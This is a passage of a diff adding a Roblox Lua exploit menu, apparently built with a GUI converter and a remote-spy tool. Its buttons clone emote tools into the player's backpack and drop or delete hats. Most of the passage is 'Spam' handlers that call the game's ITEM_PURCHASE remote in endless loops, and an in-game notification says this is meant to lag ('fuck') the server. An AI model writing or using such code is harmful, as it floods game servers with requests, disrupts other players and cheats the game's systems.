+	local script = Instance.new('Script', Tools)
+
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+	local a = game:GetService("ReplicatedStorage").Assets.Emotes.Backflip:clone()
+	a.Parent = game.Players.LocalPlayer.Backpack
+	wait(1)
+	local b = game:GetService("ReplicatedStorage").Assets.Emotes.BestMates:clone()
+	b.Parent = game.Players.LocalPlayer.Backpack
+	wait(1)
+	local c = game:GetService("ReplicatedStorage").Assets.Emotes.Fresh:clone()
+	c.Parent = game.Players.LocalPlayer.Backpack
+	wait(1)
+	local d = game:GetService("ReplicatedStorage").Assets.Emotes.TakeTheL:clone()
+	d.Parent = game.Players.LocalPlayer.Backpack
+	end)
+end
+coroutine.wrap(CMIIFN_fake_script)()
+local function EUTP_fake_script() -- Tools.Message 
+	local script = Instance.new('LocalScript', Tools)
+
+	local StarterGui = game:GetService("StarterGui")
+	
+	local Notifications = {
+		"Notification Message 1",
+	}
+	
+	local TimeBetweenNotifications = 5 --REPLACE 5 WITH THE NUMBER OF SECONDS YOU WANT TO WAIT IN BETWEEN NOTIFICATIONS APPEARING
+	
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+	for i = 1, #Notifications do
+		local Notification = Notifications[i]
+			
+		StarterGui:SetCore("SendNotification", {
+			Title = "Tools";
+			Text = "Succesfuly obitained tools!";
+			Duration = 7;
+		})
+			
+		wait(TimeBetweenNotifications)
+	end
+	end)
+end
+coroutine.wrap(EUTP_fake_script)()
+local function TENJAKR_fake_script() -- Rainbow.RainbowFunction 
+	local script = Instance.new('LocalScript', Rainbow)
+
+	while true do 
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(i, 0, n)
+	wait() 
+	end
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(n, i, 0)
+	wait()
+	end
+	i = 0
+	for n=1,0,-0.05 do 
+	i = i + 0.05
+	script.Parent.BackgroundColor3 = Color3.new(0, n, i)
+	wait() 
+	end 
+	end
+end
+coroutine.wrap(TENJAKR_fake_script)()
+local function CDRVSOD_fake_script() -- CloseOpen.Script 
+	local script = Instance.new('Script', CloseOpen)
+
+	local hub = script.Parent.Parent.Hub
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+	if hub.Visible==true then button.Text="+" hub.Visible=false
+	else hub.Visible=true button.Text="-"
+	end
+	end)
+end
+coroutine.wrap(CDRVSOD_fake_script)()
+local function OXKJ_fake_script() -- TryOnAnims.Dragify 
+	local script = Instance.new('LocalScript', TryOnAnims)
+
+	local UIS = game:GetService("UserInputService")
+	function dragify(Frame)
+	    dragToggle = nil
+	    local dragSpeed = 0.50
+	    dragInput = nil
+	    dragStart = nil
+	    local dragPos = nil
+	    function updateInput(input)
+	        local Delta = input.Position - dragStart
+	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
+	    end
+	    Frame.InputBegan:Connect(function(input)
+	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+	            dragToggle = true
+	            dragStart = input.Position
+	            startPos = Frame.Position
+	            input.Changed:Connect(function()
+	                if input.UserInputState == Enum.UserInputState.End then
+	                    dragToggle = false
+	                end
+	            end)
+	        end
+	    end)
+	    Frame.InputChanged:Connect(function(input)
+	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+	            dragInput = input
+	        end
+	    end)
+	    game:GetService("UserInputService").InputChanged:Connect(function(input)
+	        if input == dragInput and dragToggle then
+	            updateInput(input)
+	        end
+	    end)
+	end
+	
+	dragify(script.Parent)
+end
+coroutine.wrap(OXKJ_fake_script)()
+local function GLMOFZ_fake_script() -- AntiLag.Script 
+	local script = Instance.new('Script', AntiLag)
+
+	local button = script.Parent
+	_G.AntiLag = false
+	
+	button.MouseButton1Click:Connect(function()
+		_G.AntiLag = true
+		
+		while wait() do
+			if _G.AntiLag == true then
+				for i,v in pairs(game.Workspace:GetChildren()) do 
+					if v:IsA("Accessory") then v:Destroy()
+					end 
+				end
+			end
+		end
+	end)
+end
+coroutine.wrap(GLMOFZ_fake_script)()
+local function YHHQL_fake_script() -- AntiLag.Message 
+	local script = Instance.new('LocalScript', AntiLag)
+
+	local StarterGui = game:GetService("StarterGui")
+	local button = script.Parent
+	
+	local Notifications = {
+		"Notification Message 1",
+	}
+	
+	local TimeBetweenNotifications = 5 --REPLACE 5 WITH THE NUMBER OF SECONDS YOU WANT TO WAIT IN BETWEEN NOTIFICATIONS APPEARING
+	
+	button.MouseButton1Click:Connect(function()
+		for i = 1, #Notifications do
+			local Notification = Notifications[i]
+				
+			StarterGui:SetCore("SendNotification", {
+				Title = "Anti Lag";
+				Text = "This function removes hats from workspace only on your client and helps you to fuck the server easly if you are using a trash computer.";
+				Duration = 5;
+			})
+				
+			wait(TimeBetweenNotifications)
+		end
+	end)
+end
+coroutine.wrap(YHHQL_fake_script)()
+local function EIXRPMG_fake_script() -- DropHats.Script 
+	local script = Instance.new('Script', DropHats)
+
+	local button = script.Parent
+	_G.Hat = false
+	
+	button.MouseButton1Click:Connect(function()
+		_G.Hat = true
+		
+		while wait() do
+			if _G.Hat == true then
+				for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+					if (v:IsA("Accessory")) then
+						v.Parent = workspace
+					end
+				end
+			end
+		end
+	end)
+end
+coroutine.wrap(EIXRPMG_fake_script)()
+local function OQQSS_fake_script() -- Spam1.Script 
+	local script = Instance.new('Script', Spam1)
+
+	local button = script.Parent
+	_G.Lag1 = false
+	
+	button.MouseButton1Click:Connect(function()
+		_G.Lag1 = true
+		
+		while wait() do
+			if _G.Lag1 == true then
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Fiery Horns of the Netherworld",
+					[2] = "8",
+					[3] = "215718515",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Frozen Horns of the Frigid Planes",
+					[2] = "8",
+					[3] = "74891470",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+			end
+		end
+	end)
+end
+coroutine.wrap(OQQSS_fake_script)()
+local function IKAVGHD_fake_script() -- Spam1.Script 
+	local script = Instance.new('Script', Spam1)
+
+	local button = script.Parent
+	_G.Lag1 = false
+	
+	button.MouseButton1Click:Connect(function()
+		_G.Lag1 = true
+		
+		while wait() do
+			if _G.Lag1 == true then
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Fiery Horns of the Netherworld",
+					[2] = "8",
+					[3] = "215718515",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Frozen Horns of the Frigid Planes",
+					[2] = "8",
+					[3] = "74891470",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+			end
+		end
+	end)
+end
+coroutine.wrap(IKAVGHD_fake_script)()
+local function RMSIGF_fake_script() -- Spam1.Script 
+	local script = Instance.new('Script', Spam1)
+
+	local button = script.Parent
+	_G.Lag1 = false
+	
+	button.MouseButton1Click:Connect(function()
+		_G.Lag1 = true
+		
+		while wait() do
+			if _G.Lag1 == true then
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Fiery Horns of the Netherworld",
+					[2] = "8",
+					[3] = "215718515",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Frozen Horns of the Frigid Planes",
+					[2] = "8",
+					[3] = "74891470",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+			end
+		end
+	end)
+end
+coroutine.wrap(RMSIGF_fake_script)()
+local function LLTW_fake_script() -- Spam1.Script 
+	local script = Instance.new('Script', Spam1)
+
+	local button = script.Parent
+	_G.Lag1 = false
+	
+	button.MouseButton1Click:Connect(function()
+		_G.Lag1 = true
+		
+		while wait() do
+			if _G.Lag1 == true then
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Fiery Horns of the Netherworld",
+					[2] = "8",
+					[3] = "215718515",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Frozen Horns of the Frigid Planes",
+					[2] = "8",
+					[3] = "74891470",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+			end
+		end
+	end)
+end
+coroutine.wrap(LLTW_fake_script)()
+local function FOKOCG_fake_script() -- Spam1.Script 
+	local script = Instance.new('Script', Spam1)
+
+	local button = script.Parent
+	_G.Lag1 = false
+	
+	button.MouseButton1Click:Connect(function()
+		_G.Lag1 = true
+		
+		while wait() do
+			if _G.Lag1 == true then
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Fiery Horns of the Netherworld",
+					[2] = "8",
+					[3] = "215718515",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Frozen Horns of the Frigid Planes",
+					[2] = "8",
+					[3] = "74891470",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+			end
+		end
+	end)
+end
+coroutine.wrap(FOKOCG_fake_script)()
+local function PFKKYZ_fake_script() -- Spam1.Script 
+	local script = Instance.new('Script', Spam1)
+
+	local button = script.Parent
+	_G.Lag1 = false
+	
+	button.MouseButton1Click:Connect(function()
+		_G.Lag1 = true
+		
+		while wait() do
+			if _G.Lag1 == true then
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Fiery Horns of the Netherworld",
+					[2] = "8",
+					[3] = "215718515",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Frozen Horns of the Frigid Planes",
+					[2] = "8",
+					[3] = "74891470",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+			end
+		end
+	end)
+end
+coroutine.wrap(PFKKYZ_fake_script)()
+local function TNYDFZZ_fake_script() -- Spam1.Script 
+	local script = Instance.new('Script', Spam1)
+
+	local button = script.Parent
+	_G.Lag1 = false
+	
+	button.MouseButton1Click:Connect(function()
+		_G.Lag1 = true
+		
+		while wait() do
+			if _G.Lag1 == true then
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Fiery Horns of the Netherworld",
+					[2] = "8",
+					[3] = "215718515",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Frozen Horns of the Frigid Planes",
+					[2] = "8",
+					[3] = "74891470",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+			end
+		end
+	end)
+end
+coroutine.wrap(TNYDFZZ_fake_script)()
+local function FWNNBCP_fake_script() -- Spam1.Script 
+	local script = Instance.new('Script', Spam1)
+
+	local button = script.Parent
+	_G.Lag1 = false
+	
+	button.MouseButton1Click:Connect(function()
+		_G.Lag1 = true
+		
+		while wait() do
+			if _G.Lag1 == true then
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Fiery Horns of the Netherworld",
+					[2] = "8",
+					[3] = "215718515",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Frozen Horns of the Frigid Planes",
+					[2] = "8",
+					[3] = "74891470",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+			end
+		end
+	end)
+end
+coroutine.wrap(FWNNBCP_fake_script)()
+local function JGFPLVW_fake_script() -- Spam1.Script 
+	local script = Instance.new('Script', Spam1)
+
+	local button = script.Parent
+	_G.Lag1 = false
+	
+	button.MouseButton1Click:Connect(function()
+		_G.Lag1 = true
+		
+		while wait() do
+			if _G.Lag1 == true then
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Fiery Horns of the Netherworld",
+					[2] = "8",
+					[3] = "215718515",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Frozen Horns of the Frigid Planes",
+					[2] = "8",
+					[3] = "74891470",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+			end
+		end
+	end)
+end
+coroutine.wrap(JGFPLVW_fake_script)()
+local function CHJYF_fake_script() -- Spam2.Script 
+	local script = Instance.new('Script', Spam2)
+
+	local button = script.Parent
+	_G.Lag = false
+	
+	button.MouseButton1Click:Connect(function()
+		_G.Lag = true
+		
+		while true do
+			if _G.Lag == true then
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Fiery Horns of the Netherworld",
+					[2] = "8",
+					[3] = "215718515",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Frozen Horns of the Frigid Planes",
+					[2] = "8",
+					[3] = "74891470",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Red Flame Aura - Top",
+					[2] = "44",
+					[3] = "5548638720",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "52 Pickup",
+					[2] = "8",
+					[3] = "4904139820",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Katana Set",
+					[2] = "47",
+					[3] = "5410248084",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Red Flame Aura",
+					[2] = "47",
+					[3] = "5463718312",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Kawaii Confetti",
+					[2] = "8",
+					[3] = "5067732877",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Neon Flame Aura",
+					[2] = "47",
+					[3] = "5463621720",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Blue Butterflies",
+					[2] = "8",
+					[3] = "4597874025",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Demon",
+					[2] = "46",
+					[3] = "5319867017",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Falling Blossoms",
+					[2] = "8",
+					[3] = "4665773975",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sakura Aura",
+					[2] = "47",
+					[3] = "5321023132",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Flame Aura",
+					[2] = "47",
+					[3] = "5463688787",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sparkling Shine",
+					[2] = "8",
+					[3] = "4641935884",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Neon Flame Aura - Top",
+					[2] = "44",
+					[3] = "5548531343",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sleep Paralysis Demon",
+					[2] = "46",
+					[3] = "4932832113",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Outline Spiked Floof Tail",
+					[2] = "47",
+					[3] = "5355976632",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Banded Top Hat",
+					[2] = "8",
+					[3] = "5275861024",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Fedora",
+					[2] = "8",
+					[3] = "5314012437",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Corruption Henchmen",
+					[2] = "47",
+					[3] = "5063561894",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Growing Corruption Right",
+					[2] = "42",
+					[3] = "5314332058",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Fedora",
+					[2] = "8",
+					[3] = "5357509575",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Sword",
+					[2] = "46",
+					[3] = "5355685721",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Robe",
+					[2] = "46",
+					[3] = "5314965699",
+				}
+				
